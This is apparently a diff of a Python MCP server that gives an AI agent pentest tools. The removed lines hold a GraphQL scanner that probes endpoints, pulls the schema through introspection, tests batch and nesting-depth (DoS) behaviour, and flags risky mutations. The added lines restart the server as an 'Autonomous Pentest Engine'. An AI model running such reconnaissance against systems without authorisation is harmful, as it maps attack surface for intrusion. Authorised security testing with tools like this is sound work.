-        gql_endpoints = [endpoint, "/graphql", "/__graphql", "/api/graphql", 
-                         "/v1/graphql", "/query", "/gql", "/playground"]
-        gql_endpoints = list(set(gql_endpoints))
-        
-        found_endpoint = None
-        
-        for gql_ep in gql_endpoints:
-            try:
-                url = f"{base_url.rstrip('/')}{gql_ep}"
-                
-                # Introspection query
-                introspection_query = json.dumps({
-                    "query": "{__schema{types{name kind fields{name type{name kind}}}}}"
-                }).encode()
-                
-                req = urllib.request.Request(url, data=introspection_query, method="POST")
-                req.add_header("Content-Type", "application/json")
-                req.add_header("User-Agent", "Mozilla/5.0")
-                
-                try:
-                    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
-                        if resp.status == 200:
-                            content = resp.read(131072).decode("utf-8", errors="ignore")
-                            data = json.loads(content)
-                            
-                            if "data" in data and "__schema" in data.get("data", {}):
-                                results["graphql_found"] = True
-                                results["introspection_enabled"] = True
-                                found_endpoint = gql_ep
-                                
-                                schema = data["data"]["__schema"]
-                                types = schema.get("types", [])
-                                
-                                # Extract types (skip internal __ types)
-                                for t in types:
-                                    name = t.get("name", "")
-                                    if not name.startswith("__"):
-                                        type_info = {
-                                            "name": name,
-                                            "kind": t.get("kind"),
-                                            "fields": [f["name"] for f in (t.get("fields") or [])[:10]]
-                                        }
-                                        results["types"].append(type_info)
-                                
-                                results["security_issues"].append({
-                                    "issue": "Introspection enabled in production",
-                                    "severity": "MEDIUM",
-                                    "detail": f"Full schema exposed via {gql_ep}",
-                                })
-                                break
-                            elif "errors" in data:
-                                # GraphQL exists but introspection may be disabled
-                                results["graphql_found"] = True
-                                found_endpoint = gql_ep
-                                break
-                                
-                except urllib.error.HTTPError as e:
-                    if e.code in [400, 401, 403, 405]:
-                        results["graphql_found"] = True
-                        found_endpoint = gql_ep
-            except Exception:
-                continue
-        
-        if found_endpoint and results["graphql_found"]:
-            url = f"{base_url.rstrip('/')}{found_endpoint}"
-            
-            # Test batch queries
-            progress.update("Testing batch queries and depth limits")
-            try:
-                batch_query = json.dumps([
-                    {"query": "{__typename}"},
-                    {"query": "{__typename}"},
-                ]).encode()
-                
-                req = urllib.request.Request(url, data=batch_query, method="POST")
-                req.add_header("Content-Type", "application/json")
-                req.add_header("User-Agent", "Mozilla/5.0")
-                
-                try:
-                    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
-                        batch_data = json.loads(resp.read(4096).decode())
-                        if isinstance(batch_data, list):
-                            results["batch_queries_allowed"] = True
-                            results["security_issues"].append({
-                                "issue": "Batch queries allowed",
-                                "severity": "LOW",
-                                "detail": "Can send multiple queries in one request — potential DoS vector",
-                            })
-                except Exception:
-                    pass
-            except Exception:
-                pass
-            
-            # Test nested query depth (DoS test)
-            try:
-                # Build nested query 5 levels deep
-                nested = '{ __typename ' + '{ __typename ' * 4 + '}' * 4 + '}'
-                nested_query = json.dumps({"query": nested}).encode()
-                
-                req = urllib.request.Request(url, data=nested_query, method="POST")
-                req.add_header("Content-Type", "application/json")
-                req.add_header("User-Agent", "Mozilla/5.0")
-                
-                try:
-                    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
-                        depth_data = json.loads(resp.read(4096).decode())
-                        if "errors" in depth_data and any("depth" in str(e).lower() for e in depth_data["errors"]):
-                            results["depth_limit"] = "enforced"
-                        else:
-                            results["depth_limit"] = "not_enforced"
-                            results["security_issues"].append({
-                                "issue": "No query depth limit",
-                                "severity": "MEDIUM",
-                                "detail": "Nested queries accepted — GraphQL DoS possible",
-                            })
-                except Exception:
-                    pass
-            except Exception:
-                pass
-            
-            # Full introspection with queries and mutations
-            if results["introspection_enabled"]:
-                progress.update("Extracting queries and mutations")
-                full_intro = json.dumps({
-                    "query": """{__schema{queryType{fields{name args{name type{name}}}}
-                    mutationType{fields{name args{name type{name}}}}}}"""
-                }).encode()
-                
-                req = urllib.request.Request(url, data=full_intro, method="POST")
-                req.add_header("Content-Type", "application/json")
-                req.add_header("User-Agent", "Mozilla/5.0")
-                
-                try:
-                    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
-                        intro_data = json.loads(resp.read(131072).decode())
-                        schema = intro_data.get("data", {}).get("__schema", {})
-                        
-                        # Queries
-                        qt = schema.get("queryType", {})
-                        if qt:
-                            for field in (qt.get("fields") or [])[:20]:
-                                results["queries"].append({
-                                    "name": field["name"],
-                                    "args": [a["name"] for a in (field.get("args") or [])]
-                                })
-                        
-                        # Mutations
-                        mt = schema.get("mutationType", {})
-                        if mt:
-                            for field in (mt.get("fields") or [])[:20]:
-                                results["mutations"].append({
-                                    "name": field["name"],
-                                    "args": [a["name"] for a in (field.get("args") or [])]
-                                })
-                                # Flag dangerous mutations
-                                dangerous = ["delete", "remove", "admin", "create_user", "update_role"]
-                                if any(d in field["name"].lower() for d in dangerous):
-                                    results["security_issues"].append({
-                                        "issue": f"Dangerous mutation exposed: {field['name']}",
-                                        "severity": "HIGH",
-                                    })
-                except Exception:
-                    pass
-        
-        # Store findings
-        if results["graphql_found"]:
-            pentest_memory.store_finding(target, "graphql_introspection", "endpoint", found_endpoint)
-            pentest_memory.store_finding(target, "graphql_introspection", "technology", "graphql")
-            if results["security_issues"]:
-                pentest_memory.store_finding(target, "graphql_introspection", "vuln", {
-                    "type": "graphql_security",
-                    "issues": len(results["security_issues"]),
-                })
-        
-        results["status"] = "success"
-        results["summary"] = (
-            f"GraphQL analysis complete. "
-            f"Found: {results['graphql_found']}. "
-            f"Introspection: {results['introspection_enabled']}. "
-            f"Types: {len(results['types'])}. "
-            f"Queries: {len(results['queries'])}. "
-            f"Mutations: {len(results['mutations'])}. "
-            f"Security issues: {len(results['security_issues'])}."
-        )
-        
-    except Exception as e:
-        results["status"] = "error"
-        results["error"] = str(e)
-    
-    trace.command("graphql_introspection complete", results)
-    return json.dumps(results, indent=2, default=str)
-
-
-def main():
-    """Start the Kali MCP Server v4."""
-    import sys
-    logger.info("=" * 60)
-    logger.info("Kali MCP Server v4 - Professional Pentest & Bug Bounty Platform")
-    logger.info("=" * 60)
-    logger.info(f"Sessions directory: {SESSIONS_DIR}")
-    logger.info(f"Chain directory: {CHAIN_DIR}")
-    logger.info(f"CVE cache: {CVE_CACHE_DIR}")
-
-    # Count registered tools
-    tool_count = len([attr for attr in dir(mcp) if not attr.startswith('_')])
-    logger.info(f"Architecture: v4 (trace + progress + chain + CVE cartography)")
-    logger.info(f"Starting MCP server on stdio transport...")
-
-    mcp.run(transport="stdio")
-
+# ============================================================================
+# SERVER STARTUP
+# ============================================================================
 
 if __name__ == "__main__":
-    main()
+    logger.info("Starting Kali MCP Server v6 - Autonomous Pentest Engine")
+    logger.info("Architecture: 20 unified mega-modules")
+    mcp.run(transport="stdio")
